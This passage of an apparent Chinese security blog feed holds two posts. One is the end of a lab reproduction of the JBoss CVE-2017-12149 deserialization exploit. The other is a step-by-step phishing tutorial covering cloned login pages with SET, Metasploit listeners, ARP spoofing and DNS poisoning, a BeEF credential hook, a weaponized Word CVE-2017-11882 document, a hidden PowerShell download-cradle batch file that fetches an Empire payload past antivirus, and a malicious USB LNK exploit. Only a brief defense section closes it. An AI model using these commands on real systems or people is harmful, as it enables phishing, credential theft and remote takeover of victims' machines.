<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180801_LeUN0c_6293.jpeg" alt=""></p>
<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180817_sOlp2c_6301.jpeg" alt=""></p>
<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
<p>./jboss-6.1.0.Final/bin/run.sh</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180832_WE4CD3_6309.jpeg" alt=""></p>
<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180843_FQh3jJ_6316.jpeg" alt=""></p>
<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
<p>nmap 192.168.1.111 -A </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180855_12YJ7L_6329.jpeg" alt=""></p>
<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180912_UQjhJU_6322.jpeg" alt=""></p>
<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180923_jatTku_6333.jpeg" alt=""></p>
<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h4 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-漏洞描述&quot;&gt;&lt;a href=&quot;#0x00-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x00. 漏洞描述&quot;&gt;&lt;/a&gt;0x00. 漏洞描述&lt;/h2&gt;&lt;h4 id=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;a href=&quot;#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot; class=&quot;headerlink&quot; title=&quot;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&quot;&gt;&lt;/a&gt;2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>花式钓鱼法</title>
    <link href="http://TimeS0ng.github.io/2017/12/27/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/"/>
    <id>http://TimeS0ng.github.io/2017/12/27/花式钓鱼法/</id>
    <published>2017-12-27T02:39:14.000Z</published>
    <updated>2017-12-28T14:57:56.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-闲谈"><a href="#0x00-闲谈" class="headerlink" title="0x00. 闲谈"></a>0x00. 闲谈</h2><h4 id="emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"><a href="#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。" class="headerlink" title="&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"></a>&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。</h4><a id="more"></a>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182440_peGRkR_6191.jpeg" alt=""></p>
<h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1). 环境准备："></a>1). 环境准备：</h3><h3 id="1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"><a href="#1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）" class="headerlink" title="1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"></a>1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）</h3><h3 id="2-windows-xp"><a href="#2-windows-xp" class="headerlink" title="2. windows xp"></a>2. windows xp</h3><h3 id="3-window-7"><a href="#3-window-7" class="headerlink" title="3. window 7"></a>3. window 7</h3><h1 id="情景一："><a href="#情景一：" class="headerlink" title="情景一："></a>情景一：</h1><blockquote>
<p>利用Java Applet 进行钓鱼，不过现在的浏览器已经开始禁止这些插件了，要利用这种情景最好先做好前期的信息收集，判断目标是否支持Java Applet</p>
</blockquote>
<h4 id="第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T"><a href="#第一步：下载最新的-setookit-工具包，也可以使用kali自带的S-E-T" class="headerlink" title="第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T"></a>第一步：下载最新的 setookit 工具包，也可以使用kali自带的S.E.T</h4><blockquote>
<p>git clone <a href="https://github.com/trustedsec/social-engineer-toolkit.git" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit.git</a></p>
</blockquote>
<h4 id="第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功"><a href="#第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功" class="headerlink" title="第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功"></a>第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功</h4><blockquote>
<p>vim /etc/setoolkit/set.config</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182513_m24bV3_6241.jpeg" alt=""></p>
<h4 id="第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;1&emsp;2&emsp;no&emsp;回车&emsp;2&emsp;www.baidu.com&emsp;1&emsp;443&emsp;1 </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182524_72fK5L_6258.jpeg" alt=""></p>
<h4 id="第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"><a href="#第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听" class="headerlink" title="第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"></a>第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听</h4><blockquote>
<p>kill 0</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182535_47xLHO_6268.jpeg" alt=""></p>
<h4 id="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"><a href="#第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）" class="headerlink" title="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"></a>第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182544_uI1YdI_6356.jpeg" alt=""></p>
<hr>
<h1 id="情景二："><a href="#情景二：" class="headerlink" title="情景二："></a>情景二：</h1><blockquote>
<p>利用浏览器漏洞和中间人攻击进行钓鱼，不过这个漏洞已经比较老了，笔者只在xp上成功过，不过这里提供一种思路，万一哪天IE又抽风来个CVE…</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第一步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第一步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
<p>setookit </p>
<p>依次按照如下顺序：1&emsp;2&emsp;2&emsp;1&emsp;no&emsp;回车&emsp;5&emsp;37&emsp;2&emsp;443</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182556_R3oubQ_6381.jpeg" alt=""></p>
<h4 id="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"><a href="#第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个" class="headerlink" title="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"></a>第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个</h4><blockquote>
<p>kill 0</p>
<p>set srvport 80</p>
<p>set exitonsession false</p>
<p>set autorunscript migrate -f</p>
<p>run -j</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182608_ZogrCp_6390.jpeg" alt=""></p>
<h4 id="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章"><a href="#第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章" class="headerlink" title="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇文章"></a>第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇<a href="https://times0ng.github.io/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">文章</a></h4><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.110 -r 192.168.1.1</p>
<p>echo “192.168.1.111 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
<p>[*]进行DNS投毒时经常会失败，笔者对这种情况也有点不解，不过当我用xp的IE浏览器访问<a href="http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell" target="_blank" rel="external">http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182624_rBdD7y_6403.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182639_NQ1Zpz_6410.jpeg" alt=""></p>
<hr>
<h1 id="情景三："><a href="#情景三：" class="headerlink" title="情景三："></a>情景三：</h1><blockquote>
<p>钓鱼页面与beef结合，让鱼儿无处可逃</p>
</blockquote>
<h4 id="第一步：启动setookit-构造钓鱼页面"><a href="#第一步：启动setookit-构造钓鱼页面" class="headerlink" title="第一步：启动setookit 构造钓鱼页面"></a>第一步：启动setookit 构造钓鱼页面</h4><blockquote>
<p>setookit</p>
<p>依次按照如下顺序：1&emsp;2&emsp;3&emsp;1&emsp;local IP(192.168.1.111)&emsp;5</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182652_6jCVOg_6432.jpeg" alt=""></p>
<h4 id="第二步：启动beef，将HOOK代码嵌入钓鱼页面"><a href="#第二步：启动beef，将HOOK代码嵌入钓鱼页面" class="headerlink" title="第二步：启动beef，将HOOK代码嵌入钓鱼页面"></a>第二步：启动beef，将HOOK代码嵌入钓鱼页面</h4><blockquote>
<p>vim ~/.set/web_clone/index.html</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182704_1tJrZ6_6441.jpeg" alt=""></p>
<h4 id="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"><a href="#第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上" class="headerlink" title="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"></a>第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上</h4><blockquote>
<p><a href="http://192.168.1.111" target="_blank" rel="external">http://192.168.1.111</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182719_DRT0dh_6448.jpeg" alt=""></p>
<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182731_rP5b4s_6451.jpeg" alt=""></p>
<hr>
<h1 id="情景四："><a href="#情景四：" class="headerlink" title="情景四："></a>情景四：</h1><blockquote>
<p> 利用最新的word漏洞CVE-2017-11882钓鱼</p>
</blockquote>
<h4 id="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"><a href="#第一步：下载EXP，并将EXP集成到msf的fileformat模块当中" class="headerlink" title="第一步：下载EXP，并将EXP集成到msf的fileformat模块当中"></a>第一步：下载EXP，并将EXP集成到msf的fileformat模块当中</h4><blockquote>
<p>wget <a href="https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb" target="_blank" rel="external">https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</a></p>
<p>mv office_ms17_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182749_4NZ76L_6464.jpeg" alt=""></p>
<h4 id="第二步：启动msf生成钓鱼word"><a href="#第二步：启动msf生成钓鱼word" class="headerlink" title="第二步：启动msf生成钓鱼word"></a>第二步：启动msf生成钓鱼word</h4><blockquote>
<p>reload_all</p>
<p>use exploit/windows/fileformat/office_ms17_11882</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182803_yEBCcc_6474.jpeg" alt=""></p>
<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182814_BxOTQF_6481.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182825_2n8D2X_6483.jpeg" alt=""></p>
<hr>
<h1 id="情景五："><a href="#情景五：" class="headerlink" title="情景五："></a>情景五：</h1><blockquote>
<p>利用windows自带的powershell进行钓鱼，即发送bat文件，并将payload放到远程服务器，这样在一定程度上可以绕过杀软</p>
</blockquote>
<h4 id="第一步：下载并安装Empire，这里有Empire详细的使用教程"><a href="#第一步：下载并安装Empire，这里有Empire详细的使用教程" class="headerlink" title="第一步：下载并安装Empire，这里有Empire详细的使用教程"></a>第一步：下载并安装Empire，这里有Empire详细的<a href="https://xianzhi.aliyun.com/forum/topic/67/" target="_blank" rel="external">使用教程</a></h4><blockquote>
<p>git clone <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="external">https://github.com/EmpireProject/Empire</a></p>
</blockquote>
<h4 id="第二步：启动Empire生成payload"><a href="#第二步：启动Empire生成payload" class="headerlink" title="第二步：启动Empire生成payload"></a>第二步：启动Empire生成payload</h4><blockquote>
<p>launcher powershell times0ng</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182834_3NraFH_6547.jpeg" alt=""></p>
<h4 id="第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中"><a href="#第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中" class="headerlink" title="第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中"></a>第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中</h4><blockquote>
<p>service apache2 start</p>
<p>vim /var/www/html/empire.psl</p>
</blockquote>
<h4 id="第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"><a href="#第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软" class="headerlink" title="第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"></a>第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软</h4><blockquote>
<p>powershell -ExecutionPolicy Bypass -w hidden IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
<hr>
<h1 id="情景六："><a href="#情景六：" class="headerlink" title="情景六："></a>情景六：</h1><blockquote>
<p>利用USB社工钓鱼，记得当初看黑客军团时里面的黑客小姐姐就是利用BadUSB加社工黑进监狱的</p>
</blockquote>
<h4 id="第一步：利用msf生成攻击向量"><a href="#第一步：利用msf生成攻击向量" class="headerlink" title="第一步：利用msf生成攻击向量"></a>第一步：利用msf生成攻击向量</h4><blockquote>
<p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183113_tXAzGF_6507.jpeg" alt=""></p>
<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183126_dYJ5SW_6514.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183138_XzAql1_6518.jpeg" alt=""></p>
<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183152_b9Kxw1_6527.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183205_jgJnId_6529.jpeg" alt=""></p>
<hr>
<h2 id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02. 防御建议"></a>0x02. 防御建议</h2><h4 id="多了解攻击手段，以攻代防，知己知彼"><a href="#多了解攻击手段，以攻代防，知己知彼" class="headerlink" title="[*] 多了解攻击手段，以攻代防，知己知彼"></a>[*] 多了解攻击手段，以攻代防，知己知彼</h4><h4 id="不要轻易打开任何可执行文件"><a href="#不要轻易打开任何可执行文件" class="headerlink" title="[*] 不要轻易打开任何可执行文件"></a>[*] 不要轻易打开任何可执行文件</h4><h4 id="不要轻易点击陌生链接"><a href="#不要轻易点击陌生链接" class="headerlink" title="[*] 不要轻易点击陌生链接"></a>[*] 不要轻易点击陌生链接</h4><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"><a href="#emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…" class="headerlink" title="&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"></a>&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…</h4>]]></content>
    
    <summary type="html">
    
